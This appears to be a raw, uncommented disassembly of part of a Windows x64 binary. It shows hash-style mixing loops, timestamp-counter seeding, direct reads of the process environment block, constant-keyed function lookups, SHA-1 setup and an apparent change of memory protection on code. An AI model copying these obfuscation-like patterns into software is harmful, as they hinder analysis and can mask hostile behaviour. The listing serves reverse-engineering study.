   140040aa9:	push   0x8
   140040aab:	pop    rax
   140040aac:	movabs rcx,0x11f98e4f2a9e6527
   140040ab6:	movabs rdi,0x406aa9c82dbf9701
   140040ac0:	movabs r12,0xeb591050d1f713a9
   140040aca:	cmp    rax,0x58
   140040ace:	je     0x140040bae
   140040ad4:	mov    rdx,r13
   140040ad7:	xor    rdx,rcx
   140040ada:	imul   rdx,rdi
   140040ade:	mov    r8,rdx
   140040ae1:	shr    r8,0x1d
   140040ae5:	xor    r8,rdx
   140040ae8:	imul   r8,r12
   140040aec:	mov    rdx,r8
   140040aef:	shr    rdx,0x20
   140040af3:	xor    rdx,r8
   140040af6:	mov    r8,rcx
   140040af9:	movabs r9,0x629eef0eeda7e1b9
   140040b03:	xor    r8,r9
   140040b06:	imul   r8,rdi
   140040b0a:	mov    r10,r8
   140040b0d:	shr    r10,0x1d
   140040b11:	xor    r10,r8
   140040b14:	imul   r10,r12
   140040b18:	mov    r9,r10
   140040b1b:	shr    r9,0x20
   140040b1f:	xor    r9,r10
   140040b22:	mov    r10,rdx
   140040b25:	rol    r10,0x7
   140040b29:	or     r9,0x1
   140040b2d:	mov    r11,rdx
   140040b30:	rol    r11,0x29
   140040b34:	add    r10,rcx
   140040b37:	mov    r8,QWORD PTR [rbp+rax*1+0xd08]
   140040b3f:	add    r8,r10
   140040b42:	imul   r8,r9
   140040b46:	add    r8,r13
   140040b49:	add    r8,r15
   140040b4c:	mov    r15,rcx
   140040b4f:	rol    r15,0x20
   140040b53:	movabs rbx,0x6161c4ba7c2419b8
   140040b5d:	xor    r15,rbx
   140040b60:	lea    rsi,[r11+r15*1]
   140040b64:	sub    r15,r10
   140040b67:	add    rsi,QWORD PTR [rbp+rax*1+0xd10]
   140040b6f:	add    r15,r11
   140040b72:	imul   rsi,r9
   140040b76:	imul   r15,r9
   140040b7a:	sub    r15,rdx
   140040b7d:	sub    r15,rsi
   140040b80:	add    r15,r8
   140040b83:	xor    rcx,rbx
   140040b86:	imul   rcx,rdi
   140040b8a:	mov    r8,rcx
   140040b8d:	shr    r8,0x1d
   140040b91:	xor    r8,rcx
   140040b94:	imul   r8,r12
   140040b98:	mov    rcx,r8
   140040b9b:	shr    rcx,0x20
   140040b9f:	xor    rcx,r8
   140040ba2:	add    rax,0x10
   140040ba6:	mov    r13,rdx
   140040ba9:	jmp    0x140040aca
   140040bae:	add    r13,r15
   140040bb1:	mov    rcx,r13
   140040bb4:	call   0x140063d89
   140040bb9:	mov    QWORD PTR [rbp+0x1180],rax
   140040bc0:	mov    rbx,QWORD PTR [rbp+0x680]
   140040bc7:	mov    r14,QWORD PTR [rbp+0x688]
   140040bce:	mov    rax,QWORD PTR [rbp+0x1160]
   140040bd5:	mov    rdi,QWORD PTR [rax+0x28]
   140040bd9:	call   0x140064168
   140040bde:	cmp    rax,0x1
   140040be2:	jne    0x140040bf8
   140040be4:	lea    rax,[rip+0x235c8]        # 0x1400641b3
   140040beb:	mov    ecx,eax
   140040bed:	sub    ecx,edx
   140040bef:	sub    ebx,edx
   140040bf1:	mov    edx,ebx
   140040bf3:	mov    r8d,r14d
   140040bf6:	jmp    0x140040c00
   140040bf8:	xor    ecx,ecx
   140040bfa:	xor    edx,edx
   140040bfc:	push   0x1
   140040bfe:	pop    r8
   140040c00:	mov    r9,rdi
   140040c03:	call   0x140063e53
   140040c08:	mov    QWORD PTR [rbp+0x1170],rax
   140040c0f:	mov    rax,QWORD PTR [rbp+0x1160]
   140040c16:	mov    rcx,QWORD PTR [rax+0x10]
   140040c1a:	rdtsc
   140040c1c:	shl    rdx,0x20
   140040c20:	or     rdx,rax
   140040c23:	movabs rax,0xa35e6f073808b85a
   140040c2d:	xor    rdx,rax
   140040c30:	movabs rax,0x406aa9c82dbf9701
   140040c3a:	imul   rdx,rax
   140040c3e:	mov    rax,rdx
   140040c41:	shr    rax,0x1d
   140040c45:	xor    rax,rdx
   140040c48:	imul   rax,r12
   140040c4c:	mov    r14,rax
   140040c4f:	shr    r14,0x20
   140040c53:	xor    r14,rax
   140040c56:	mov    rbx,r14
   140040c59:	neg    rbx
   140040c5c:	add    rbx,rcx
   140040c5f:	mov    ecx,0x9394fb88
   140040c64:	mov    edx,0x76fcc57c
   140040c69:	call   0x140064480
   140040c6e:	test   rax,rax
   140040c71:	je     0x140040c88
   140040c73:	mov    r15d,DWORD PTR [rax]
   140040c76:	mov    r12d,DWORD PTR [rax+0x4]
   140040c7a:	call   0x14006495d
   140040c7f:	cmp    eax,0x1
   140040c82:	jne    0x140040c93
   140040c84:	mov    eax,edx
   140040c86:	jmp    0x140040cb1
   140040c88:	xor    r12d,r12d
   140040c8b:	push   0xffffffffffffffff
   140040c8d:	pop    r15
   140040c8f:	xor    eax,eax
   140040c91:	jmp    0x140040cb1
   140040c93:	call   0x14006613c
   140040c98:	call   0x14006495d
   140040c9d:	and    al,0x1
   140040c9f:	mov    r15d,r15d
   140040ca2:	mov    ecx,edx
   140040ca4:	cmp    al,0x1
   140040ca6:	mov    eax,0x0
   140040cab:	sbb    rax,rax
   140040cae:	or     rax,rcx
   140040cb1:	mov    ecx,r12d
   140040cb4:	mov    QWORD PTR [rbp+0x7d0],r15
   140040cbb:	mov    edx,0xb8d18b4c
   140040cc0:	mov    QWORD PTR [rbp+0x7d8],rdx
   140040cc7:	mov    QWORD PTR [rbp+0x7e0],rcx
   140040cce:	mov    QWORD PTR [rbp+0x7e8],rax
   140040cd5:	xor    eax,eax
   140040cd7:	movabs rcx,0xa35e6f073808b85a
   140040ce1:	movabs rdi,0xeb591050d1f713a9
   140040ceb:	cmp    rax,0x20
   140040cef:	je     0x140040de8
   140040cf5:	mov    rdx,rcx
   140040cf8:	xor    rdx,r14
   140040cfb:	movabs rsi,0x406aa9c82dbf9701
   140040d05:	imul   rdx,rsi
   140040d09:	mov    r8,rdx
   140040d0c:	shr    r8,0x1d
   140040d10:	xor    r8,rdx
   140040d13:	imul   r8,rdi
   140040d17:	mov    rdx,r8
   140040d1a:	shr    rdx,0x20
   140040d1e:	xor    rdx,r8
   140040d21:	mov    r8,rcx
   140040d24:	movabs r9,0x629eef0eeda7e1b9
   140040d2e:	xor    r8,r9
   140040d31:	imul   r8,rsi
   140040d35:	mov    r10,r8
   140040d38:	shr    r10,0x1d
   140040d3c:	xor    r10,r8
   140040d3f:	imul   r10,rdi
   140040d43:	mov    r9,r10
   140040d46:	shr    r9,0x20
   140040d4a:	xor    r9,r10
   140040d4d:	mov    r12,rdx
   140040d50:	rol    r12,0x7
   140040d54:	mov    r15,rdx
   140040d57:	rol    r15,0x29
   140040d5b:	mov    r8,rcx
   140040d5e:	rol    r8,0x20
   140040d62:	movabs r13,0x6161c4ba7c2419b8
   140040d6c:	xor    r8,r13
   140040d6f:	add    r12,rcx
   140040d72:	mov    r11,QWORD PTR [rbp+rax*1+0x7d0]
   140040d7a:	add    r11,r12
   140040d7d:	mov    r10,QWORD PTR [rbp+rax*1+0x7d8]
   140040d85:	add    r10,r8
   140040d88:	sub    r8,r12
   140040d8b:	movabs rdi,0xeb591050d1f713a9
   140040d95:	add    r10,r15
   140040d98:	add    r8,r15
   140040d9b:	or     r9,0x1
   140040d9f:	imul   r11,r9
   140040da3:	imul   r10,r9
   140040da7:	imul   r8,r9
   140040dab:	add    r11,r14
   140040dae:	add    rbx,r11
   140040db1:	sub    r8,rdx
   140040db4:	sub    r8,r10
   140040db7:	add    r8,rbx
   140040dba:	xor    rcx,r13
   140040dbd:	imul   rcx,rsi
   140040dc1:	mov    r9,rcx
   140040dc4:	shr    r9,0x1d
   140040dc8:	xor    r9,rcx
   140040dcb:	imul   r9,rdi
   140040dcf:	mov    rcx,r9
   140040dd2:	shr    rcx,0x20
   140040dd6:	xor    rcx,r9
   140040dd9:	add    rax,0x10
   140040ddd:	mov    rbx,r8
   140040de0:	mov    r14,rdx
   140040de3:	jmp    0x140040ceb
   140040de8:	mov    QWORD PTR [rbp+0x408],r14
   140040def:	movabs rax,0x6b20b431daeb7a6f
   140040df9:	mov    QWORD PTR [rbp+0x410],rax
   140040e00:	mov    QWORD PTR [rbp+0x400],rbx
   140040e07:	lea    rcx,[rbp+0x400]
   140040e0e:	call   0x14003aef8
   140040e13:	mov    r14,QWORD PTR gs:0x60
   140040e1c:	mov    rbx,QWORD PTR gs:0x40
   140040e25:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   140040e2c:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   140040e33:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   140040e3a:	and    DWORD PTR [rbp+0x640],0x0
   140040e41:	mov    ecx,0x43b0f7b9
   140040e46:	call   0x1400660f6
   140040e4b:	mov    r15d,0xc0000001
   140040e51:	mov    r12d,0xc0000001
   140040e57:	cmp    eax,0x1
   140040e5a:	lea    rsi,[rbp+0x7d0]
   140040e61:	jne    0x140040eaf
   140040e63:	or     QWORD PTR [rbp+0x7d0],0xffffffffffffffff
   140040e6b:	and    QWORD PTR [rbp+0x7d8],0x0
   140040e73:	lea    rax,[rbp+0xf80]
   140040e7a:	mov    QWORD PTR [rbp+0x7e0],rax
   140040e81:	mov    QWORD PTR [rbp+0x7e8],0x30
   140040e8c:	lea    rax,[rbp+0x640]
   140040e93:	mov    QWORD PTR [rbp+0x7f0],rax
   140040e9a:	and    QWORD PTR [rbp+0x7f8],0x0
   140040ea2:	mov    ecx,edx
   140040ea4:	mov    rdx,rsi
   140040ea7:	call   0x14006616d
   140040eac:	mov    r12d,eax
   140040eaf:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   140040eb6:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140040ebd:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140040ec4:	and    QWORD PTR [rbp+0x290],0x0
   140040ecc:	mov    ecx,0xb17aae04
   140040ed1:	call   0x1400660f6
   140040ed6:	cmp    eax,0x1
   140040ed9:	jne    0x140040f2d
   140040edb:	or     QWORD PTR [rbp+0x7d0],0xffffffffffffffff
   140040ee3:	lea    rax,[rip+0x228f5]        # 0x1400637df
   140040eea:	mov    QWORD PTR [rbp+0x7d8],rax
   140040ef1:	and    QWORD PTR [rbp+0x7e0],0x0
   140040ef9:	lea    rax,[rbp+0xd10]
   140040f00:	mov    QWORD PTR [rbp+0x7e8],rax
   140040f07:	mov    QWORD PTR [rbp+0x7f0],0x30
   140040f12:	lea    rax,[rbp+0x290]
   140040f19:	mov    QWORD PTR [rbp+0x7f8],rax
   140040f20:	mov    ecx,edx
   140040f22:	mov    rdx,rsi
   140040f25:	call   0x14006616d
   140040f2a:	mov    r15d,eax
   140040f2d:	mov    r13,QWORD PTR [rbp+0xf88]
   140040f34:	mov    rsi,QWORD PTR [rbp+0xfa0]
   140040f3b:	mov    rdi,QWORD PTR [rbp+0xd18]
   140040f42:	call   0x1400641a4
   140040f47:	test   al,0x1
   140040f49:	mov    eax,0x0
   140040f4e:	cmove  rdx,rax
   140040f52:	mov    eax,DWORD PTR [rbp+0xd38]
   140040f58:	mov    QWORD PTR [rbp+0x7d0],r12
   140040f5f:	and    QWORD PTR [rbp+0x7d8],0x0
   140040f67:	mov    QWORD PTR [rbp+0x7e0],r13
   140040f6e:	mov    QWORD PTR [rbp+0x7e8],r14
   140040f75:	mov    QWORD PTR [rbp+0x7f0],rsi
   140040f7c:	mov    QWORD PTR [rbp+0x7f8],rbx
   140040f83:	mov    QWORD PTR [rbp+0x800],r15
   140040f8a:	and    QWORD PTR [rbp+0x808],0x0
   140040f92:	mov    QWORD PTR [rbp+0x810],rdi
   140040f99:	mov    QWORD PTR [rbp+0x818],rdx
   140040fa0:	mov    QWORD PTR [rbp+0x820],rax
   140040fa7:	mov    QWORD PTR [rbp+0x828],0x1000000
   140040fb2:	mov    rax,QWORD PTR [rbp+0x400]
   140040fb9:	mov    r8,QWORD PTR [rbp+0x408]
   140040fc0:	mov    rdx,QWORD PTR [rbp+0x410]
   140040fc7:	push   0x8
   140040fc9:	pop    rcx
   140040fca:	movabs r14,0x406aa9c82dbf9701
   140040fd4:	movabs r12,0xeb591050d1f713a9
   140040fde:	cmp    rcx,0x68
   140040fe2:	je     0x1400410db
   140040fe8:	mov    r9,rdx
   140040feb:	xor    r9,r8
   140040fee:	imul   r9,r14
   140040ff2:	mov    r10,r9
   140040ff5:	shr    r10,0x1d
   140040ff9:	xor    r10,r9
   140040ffc:	imul   r10,r12
   140041000:	mov    r9,r10
   140041003:	shr    r9,0x20
   140041007:	xor    r9,r10
   14004100a:	mov    r10,rdx
   14004100d:	movabs r11,0x629eef0eeda7e1b9
   140041017:	xor    r10,r11
   14004101a:	imul   r10,r14
   14004101e:	mov    rsi,r10
   140041021:	shr    rsi,0x1d
   140041025:	xor    rsi,r10
   140041028:	imul   rsi,r12
   14004102c:	mov    r11,rsi
   14004102f:	shr    r11,0x20
   140041033:	xor    r11,rsi
   140041036:	mov    r12,r9
   140041039:	rol    r12,0x7
   14004103d:	mov    r15,r9
   140041040:	rol    r15,0x29
   140041044:	mov    r10,rdx
   140041047:	rol    r10,0x20
   14004104b:	movabs rsi,0x6161c4ba7c2419b8
   140041055:	xor    r10,rsi
   140041058:	add    r12,rdx
   14004105b:	mov    r14,QWORD PTR [rbp+rcx*1+0x7c8]
   140041063:	add    r14,r12
   140041066:	mov    rbx,QWORD PTR [rbp+rcx*1+0x7d0]
   14004106e:	add    rbx,r10
   140041071:	sub    r10,r12
   140041074:	movabs r12,0xeb591050d1f713a9
   14004107e:	add    rbx,r15
   140041081:	add    r10,r15
   140041084:	or     r11,0x1
   140041088:	imul   r14,r11
   14004108c:	imul   rbx,r11
   140041090:	imul   r10,r11
   140041094:	add    r14,r8
   140041097:	add    rax,r14
   14004109a:	movabs r14,0x406aa9c82dbf9701
   1400410a4:	sub    r10,r9
   1400410a7:	sub    r10,rbx
   1400410aa:	add    r10,rax
   1400410ad:	xor    rdx,rsi
   1400410b0:	imul   rdx,r14
   1400410b4:	mov    rax,rdx
   1400410b7:	shr    rax,0x1d
   1400410bb:	xor    rax,rdx
   1400410be:	imul   rax,r12
   1400410c2:	mov    rdx,rax
   1400410c5:	shr    rdx,0x20
   1400410c9:	xor    rdx,rax
   1400410cc:	add    rcx,0x10
   1400410d0:	mov    rax,r10
   1400410d3:	mov    r8,r9
   1400410d6:	jmp    0x140040fde
   1400410db:	mov    QWORD PTR [rbp+0x408],r8
   1400410e2:	mov    QWORD PTR [rbp+0x410],rdx
   1400410e9:	mov    QWORD PTR [rbp+0x400],rax
   1400410f0:	mov    r9d,DWORD PTR [rip+0x579a1]        # 0x140098a98
   1400410f7:	mov    rcx,rdx
   1400410fa:	xor    rcx,r8
   1400410fd:	imul   rcx,r14
   140041101:	mov    r10,rcx
   140041104:	shr    r10,0x1d
   140041108:	xor    r10,rcx
   14004110b:	imul   r10,r12
   14004110f:	mov    rcx,r10
   140041112:	shr    rcx,0x20
   140041116:	xor    rcx,r10
   140041119:	mov    r10,rdx
   14004111c:	movabs r11,0x629eef0eeda7e1b9
   140041126:	xor    r10,r11
   140041129:	imul   r10,r14
   14004112d:	mov    rsi,r10
   140041130:	shr    rsi,0x1d
   140041134:	xor    rsi,r10
   140041137:	imul   rsi,r12
   14004113b:	mov    r11,rsi
   14004113e:	shr    r11,0x20
   140041142:	xor    r11,rsi
   140041145:	mov    rsi,rcx
   140041148:	rol    rsi,0x7
   14004114c:	or     r11,0x1
   140041150:	mov    rdi,rcx
   140041153:	rol    rdi,0x29
   140041157:	mov    r10,rdx
   14004115a:	rol    r10,0x20
   14004115e:	movabs rbx,0x6161c4ba7c2419b8
   140041168:	xor    r10,rbx
   14004116b:	add    rsi,rdx
   14004116e:	add    r9,rsi
   140041171:	imul   r9,r11
   140041175:	lea    rdx,[rdi+r10*1]
   140041179:	imul   rdx,r11
   14004117d:	sub    r10,rsi
   140041180:	add    r10,rdi
   140041183:	imul   r10,r11
   140041187:	add    r9,r8
   14004118a:	add    r9,rax
   14004118d:	sub    r10,rcx
   140041190:	sub    r10,rdx
   140041193:	add    r10,r9
   140041196:	add    rcx,r10
   140041199:	call   0x140063ec6
   14004119e:	mov    rcx,QWORD PTR [rbp+0x1170]
   1400411a5:	mov    QWORD PTR [rsp+0x28],rcx
   1400411aa:	mov    rcx,QWORD PTR [rbp+0x1180]
   1400411b1:	mov    QWORD PTR [rsp+0x20],rcx
   1400411b6:	mov    rcx,QWORD PTR [rbp+0x4e8]
   1400411bd:	mov    rdx,QWORD PTR [rbp+0xcb0]
   1400411c4:	mov    r8,rax
   1400411c7:	mov    r9,QWORD PTR [rbp+0x1168]
   1400411ce:	call   0x140063d03
   1400411d3:	mov    rsi,rax
   1400411d6:	mov    edi,DWORD PTR [rip+0x578ac]        # 0x140098a88
   1400411dc:	test   edi,edi
   1400411de:	je     0x140041203
   1400411e0:	call   QWORD PTR [rip+0x5346a]        # 0x140094650
   1400411e6:	xor    eax,edi
   1400411e8:	movabs rcx,0x250993835123b80f
   1400411f2:	imul   rax,rcx
   1400411f6:	mov    rcx,rax
   1400411f9:	shr    rcx,0x1d
   1400411fd:	xor    rcx,rax
   140041200:	xor    rsi,rcx
   140041203:	lea    r13,[rbp+0x7d0]
   14004120a:	mov    rbx,QWORD PTR [rbp+0x5d0]
   140041211:	mov    rdx,QWORD PTR [rbp+0xca8]
   140041218:	mov    r8,QWORD PTR [rbp+0x7c8]
   14004121f:	mov    r9,QWORD PTR [rbp+0xf68]
   140041226:	mov    QWORD PTR [rbp+0x3d0],rsi
   14004122d:	mov    QWORD PTR [rbp+0x10b8],rsi
   140041234:	cmp    rbx,0x7
   140041238:	jbe    0x14004127b
   14004123a:	mov    rax,QWORD PTR [rbp+0xf70]
   140041241:	lea    rcx,[rax+0x1]
   140041245:	mov    QWORD PTR [rbp+0x10c8],rcx
   14004124c:	test   rax,rax
   14004124f:	je     0x1400412b5
   140041251:	cmp    rax,QWORD PTR [rbp+0x5f8]
   140041258:	jbe    0x14004129c
   14004125a:	sub    rax,QWORD PTR [rbp+0x7a0]
   140041261:	add    rax,0x10
   140041265:	cmp    rax,0x7
   140041269:	ja     0x14004129c
   14004126b:	mov    al,BYTE PTR [rbp+rax*1+0x10d8]
   140041272:	mov    QWORD PTR [rbp+0xf70],rcx
   140041279:	jmp    0x14004128c
   14004127b:	mov    al,BYTE PTR [rbp+rbx*1+0x10b8]
   140041282:	inc    rbx
   140041285:	mov    QWORD PTR [rbp+0x10c0],rbx
   14004128c:	mov    QWORD PTR [rbp+0x1160],0x0
   140041297:	push   0x1
   140041299:	pop    rsi
   14004129a:	jmp    0x1400412cc
   14004129c:	mov    QWORD PTR [rbp+0x1160],0x0
   1400412a7:	mov    QWORD PTR [rbp+0xf70],rcx
   1400412ae:	push   0x1
   1400412b0:	pop    rsi
   1400412b1:	xor    eax,eax
   1400412b3:	jmp    0x1400412cc
   1400412b5:	mov    al,0x80
   1400412b7:	push   0x1
   1400412b9:	pop    rsi
   1400412ba:	mov    QWORD PTR [rbp+0xf70],rsi
   1400412c1:	mov    QWORD PTR [rbp+0x1160],0x0
   1400412cc:	mov    BYTE PTR [rbp+rdx*1+0x710],al
   1400412d3:	mov    rdi,r9
   1400412d6:	jmp    0x14003d5e0
   1400412db:	xor    edx,edx
   1400412dd:	cmp    rdx,0x40
   1400412e1:	je     0x1400412fe
   1400412e3:	mov    QWORD PTR [rbp+rdx*1+0x7d0],0x1
   1400412ef:	and    QWORD PTR [rbp+rdx*1+0x7d8],0x0
   1400412f8:	add    rdx,0x10
   1400412fc:	jmp    0x1400412dd
   1400412fe:	mov    QWORD PTR [rbp+0x7c0],r12
   140041305:	lea    rdx,[rbp+0x7e0]
   14004130c:	movups xmm0,XMMWORD PTR [rdx]
   14004130f:	movups xmm1,XMMWORD PTR [rdx+0x10]
   140041313:	movups xmm2,XMMWORD PTR [rdx+0x20]
   140041317:	lea    rdx,[rbp+0xf90]
   14004131e:	movups XMMWORD PTR [rdx+0x20],xmm2
   140041322:	movups XMMWORD PTR [rdx+0x10],xmm1
   140041326:	movups XMMWORD PTR [rdx],xmm0
   140041329:	mov    QWORD PTR [rbp+0xf80],rcx
   140041330:	mov    QWORD PTR [rbp+0xf88],rax
   140041337:	push   0x1
   140041339:	pop    rsi
   14004133a:	mov    QWORD PTR [rbp+0xfc0],rsi
   140041341:	lea    rdi,[rbp+0xf80]
   140041348:	mov    rcx,rdi
   14004134b:	call   0x14003bf02
   140041350:	lea    rcx,[rax+0x9]
   140041354:	mov    rbx,rcx
   140041357:	shr    rbx,0x6
   14004135b:	and    ecx,0x3f
   14004135e:	cmp    rcx,rsi
   140041361:	sbb    rbx,0xffffffffffffffff
   140041365:	mov    QWORD PTR [rbp+0x1158],rbx
   14004136c:	shl    rbx,0x6
   140041370:	sub    rbx,rax
   140041373:	lea    r14,[rbx-0x9]
   140041377:	shl    rax,0x3
   14004137b:	bswap  rax
   14004137e:	mov    QWORD PTR [rbp+0xd10],rdi
   140041385:	mov    QWORD PTR [rbp+0xd18],rsi
   14004138c:	lea    rcx,[rbp+0xd18]
   140041393:	movups XMMWORD PTR [rcx+0x8],xmm6
   140041397:	movups XMMWORD PTR [rcx+0x18],xmm6
   14004139b:	mov    QWORD PTR [rbp+0xd40],r14
   1400413a2:	mov    QWORD PTR [rbp+0xd48],rax
   1400413a9:	mov    eax,0x67452301
   1400413ae:	mov    QWORD PTR [rbp+0xf60],rax
   1400413b5:	mov    DWORD PTR [rbp+0x1180],0xefcdab89
   1400413bf:	mov    DWORD PTR [rbp+0x1170],0x98badcfe
   1400413c9:	mov    DWORD PTR [rbp+0x1178],0x10325476
   1400413d3:	mov    DWORD PTR [rbp+0x1168],0xc3d2e1f0
   1400413dd:	mov    r13b,0x1
   1400413e0:	xor    r12d,r12d
   1400413e3:	xor    r15d,r15d
   1400413e6:	xor    edi,edi
   1400413e8:	xor    esi,esi
   1400413ea:	cmp    rsi,QWORD PTR [rbp+0x1158]
   1400413f1:	je     0x1400416ae
   1400413f7:	movaps XMMWORD PTR [rbp+0x2c0],xmm6
   1400413fe:	movaps XMMWORD PTR [rbp+0x2b0],xmm6
   140041405:	movaps XMMWORD PTR [rbp+0x2a0],xmm6
   14004140c:	movaps XMMWORD PTR [rbp+0x290],xmm6
   140041413:	mov    rax,QWORD PTR [rbp+0xf80]
   14004141a:	mov    rcx,QWORD PTR [rbp+0xf88]
   140041421:	xor    r8d,r8d
   140041424:	cmp    r8,0x40
   140041428:	je     0x1400414b3
   14004142e:	mov    rdx,r8
   140041431:	inc    r8
   140041434:	test   rdi,rdi
   140041437:	sete   r10b
   14004143b:	mov    r9,r15
   14004143e:	test   r10b,0x1
   140041442:	je     0x14004145d
   140041444:	xor    r15d,r15d
   140041447:	mov    r10d,0x0
   14004144d:	cmp    r9,rcx
   140041450:	jae    0x14004143b
   140041452:	mov    r10b,BYTE PTR [rax+r9*1]
   140041456:	inc    r9
   140041459:	xor    edi,edi
   14004145b:	jmp    0x1400414a3
   14004145d:	test   r12,r12
   140041460:	je     0x140041496
   140041462:	lea    r11,[r12+0x1]
   140041467:	cmp    r12,r14
   14004146a:	jbe    0x140041488
   14004146c:	sub    r12,rbx
   14004146f:	cmp    r12,0xfffffffffffffff8
   140041473:	jb     0x140041488
   140041475:	mov    r10b,BYTE PTR [rbp+r12*1+0xd50]
   14004147d:	xor    r13d,r13d
   140041480:	push   0x1
   140041482:	pop    rdi
   140041483:	mov    r12,r11
   140041486:	jmp    0x1400414a3
   140041488:	xor    r13d,r13d
   14004148b:	push   0x1
   14004148d:	pop    rdi
   14004148e:	mov    r12,r11
   140041491:	xor    r10d,r10d
   140041494:	jmp    0x1400414a3
   140041496:	mov    r10b,0x80
   140041499:	xor    r13d,r13d
   14004149c:	push   0x1
   14004149e:	pop    r12
   1400414a0:	mov    rdi,r12
   1400414a3:	mov    BYTE PTR [rbp+rdx*1+0x290],r10b
   1400414ab:	mov    r15,r9
   1400414ae:	jmp    0x140041424
   1400414b3:	mov    BYTE PTR [rbp+0xd50],r13b
   1400414ba:	mov    QWORD PTR [rbp+0xd20],rdi
   1400414c1:	mov    QWORD PTR [rbp+0xd28],r15
   1400414c8:	mov    QWORD PTR [rbp+0xd38],r12
   1400414cf:	movaps XMMWORD PTR [rbp+0x430],xmm6
   1400414d6:	movaps XMMWORD PTR [rbp+0x420],xmm6
   1400414dd:	movaps XMMWORD PTR [rbp+0x410],xmm6
   1400414e4:	movaps XMMWORD PTR [rbp+0x400],xmm6
   1400414eb:	xor    eax,eax
   1400414ed:	cmp    rax,0x40
   1400414f1:	je     0x140041509
   1400414f3:	mov    ecx,DWORD PTR [rbp+rax*1+0x290]
   1400414fa:	bswap  ecx
   1400414fc:	mov    DWORD PTR [rbp+rax*1+0x400],ecx
   140041503:	add    rax,0x4
   140041507:	jmp    0x1400414ed
   140041509:	mov    rax,QWORD PTR [rbp+0xf60]
   140041510:	mov    DWORD PTR [rbp+0x7d0],eax
   140041516:	mov    eax,DWORD PTR [rbp+0x1180]
   14004151c:	mov    DWORD PTR [rbp+0x7d4],eax
   140041522:	mov    eax,DWORD PTR [rbp+0x1170]
   140041528:	mov    DWORD PTR [rbp+0x7d8],eax
   14004152e:	mov    eax,DWORD PTR [rbp+0x1178]
   140041534:	mov    DWORD PTR [rbp+0x7dc],eax
   14004153a:	mov    eax,DWORD PTR [rbp+0x1168]
   140041540:	mov    DWORD PTR [rbp+0x7e0],eax
   140041546:	and    DWORD PTR [rbp+0x7e4],0x0
   14004154d:	movaps xmm0,XMMWORD PTR [rbp+0x400]
   140041554:	movaps xmm1,XMMWORD PTR [rbp+0x410]
   14004155b:	movaps xmm2,XMMWORD PTR [rbp+0x420]
   140041562:	movaps xmm3,XMMWORD PTR [rbp+0x430]
   140041569:	lea    rax,[rbp+0x7e8]
   140041570:	movups XMMWORD PTR [rax+0x30],xmm3
   140041574:	movups XMMWORD PTR [rax+0x20],xmm2
   140041578:	movups XMMWORD PTR [rax+0x10],xmm1
   14004157c:	movups XMMWORD PTR [rax],xmm0
   14004157f:	call   0x140064214
   140041584:	mov    al,BYTE PTR [rip+0x57503]        # 0x140098a8d
   14004158a:	cmp    al,0x1
   14004158c:	je     0x1400415d5
   14004158e:	movzx  eax,al
   140041591:	cmp    eax,0x2
   140041594:	je     0x14004169f
   14004159a:	and    DWORD PTR [rbp+0x640],0x0
   1400415a1:	lea    rcx,[rip+0xfffffffffffbfad8]        # 0x140001080
   1400415a8:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400415af:	push   0x40
   1400415b1:	pop    r8
   1400415b3:	lea    r9,[rbp+0x640]
   1400415ba:	call   QWORD PTR [rip+0x53248]        # 0x140094808
   1400415c0:	test   eax,eax
   1400415c2:	sete   cl
   1400415c5:	inc    cl
   1400415c7:	mov    BYTE PTR [rip+0x574c0],cl        # 0x140098a8d
   1400415cd:	test   eax,eax
   1400415cf:	je     0x14004169f
   1400415d5:	mov    al,BYTE PTR [rip+0x575dd]        # 0x140098bb8
   1400415db:	cmp    al,0x1
   1400415dd:	je     0x140041606
   1400415df:	movzx  eax,al
   1400415e2:	test   eax,eax
   1400415e4:	jne    0x14004169f
   1400415ea:	call   0x140065d51
   1400415ef:	test   rax,rax
   1400415f2:	sete   cl
   1400415f5:	inc    cl
   1400415f7:	mov    BYTE PTR [rip+0x575bb],cl        # 0x140098bb8
   1400415fd:	test   rax,rax
   140041600:	je     0x14004169f
   140041606:	call   0x140064227
   14004160b:	mov    eax,0xc8c291de
   140041610:	xchg   DWORD PTR [rip+0x574ca],eax        # 0x140098ae0
   140041616:	call   QWORD PTR [rip+0x53034]        # 0x140094650
   14004161c:	mov    eax,eax
   14004161e:	mov    QWORD PTR [rip+0x569db],rax        # 0x140098000
   140041625:	lea    rcx,[rbp+0x7d0]
   14004162c:	push   0xffffffffffffffff
   14004162e:	pop    rdx
   14004162f:	call   0x140010840
   140041634:	xor    eax,eax
   140041636:	xchg   DWORD PTR [rip+0x574a4],eax        # 0x140098ae0
   14004163c:	mov    BYTE PTR [rip+0x5744b],0x0        # 0x140098a8e
   140041643:	mov    rax,QWORD PTR [rbp+0xf60]
   14004164a:	add    eax,DWORD PTR [rbp+0x7d0]
   140041650:	mov    QWORD PTR [rbp+0xf60],rax
   140041657:	mov    eax,DWORD PTR [rbp+0x1180]
   14004165d:	add    eax,DWORD PTR [rbp+0x7d4]
   140041663:	mov    DWORD PTR [rbp+0x1180],eax
   140041669:	mov    eax,DWORD PTR [rbp+0x1170]
   14004166f:	add    eax,DWORD PTR [rbp+0x7d8]
   140041675:	mov    DWORD PTR [rbp+0x1170],eax
   14004167b:	mov    eax,DWORD PTR [rbp+0x1178]
   140041681:	add    eax,DWORD PTR [rbp+0x7dc]
   140041687:	mov    DWORD PTR [rbp+0x1178],eax
   14004168d:	mov    eax,DWORD PTR [rbp+0x1168]
   140041693:	add    eax,DWORD PTR [rbp+0x7e0]
   140041699:	mov    DWORD PTR [rbp+0x1168],eax
   14004169f:	inc    rsi
   1400416a2:	mov    BYTE PTR [rip+0x573e3],0x0        # 0x140098a8c
   1400416a9:	jmp    0x1400413ea
   1400416ae:	mov    eax,DWORD PTR [rbp+0x1180]
   1400416b4:	mov    rcx,QWORD PTR [rbp+0xf60]
   1400416bb:	shl    rcx,0x20
   1400416bf:	or     rcx,rax
   1400416c2:	bswap  rcx
   1400416c5:	mov    QWORD PTR [rbp+0xf60],rcx
   1400416cc:	mov    rcx,QWORD PTR [rbp+0x7c0]
   1400416d3:	mov    rdx,QWORD PTR [rbp+0x1140]
   1400416da:	call   0x140066533
   1400416df:	lea    r13,[rbp+0x7d0]
   1400416e6:	jmp    0x14003ddc6
   1400416eb:	movaps XMMWORD PTR [rbp+0xd40],xmm6
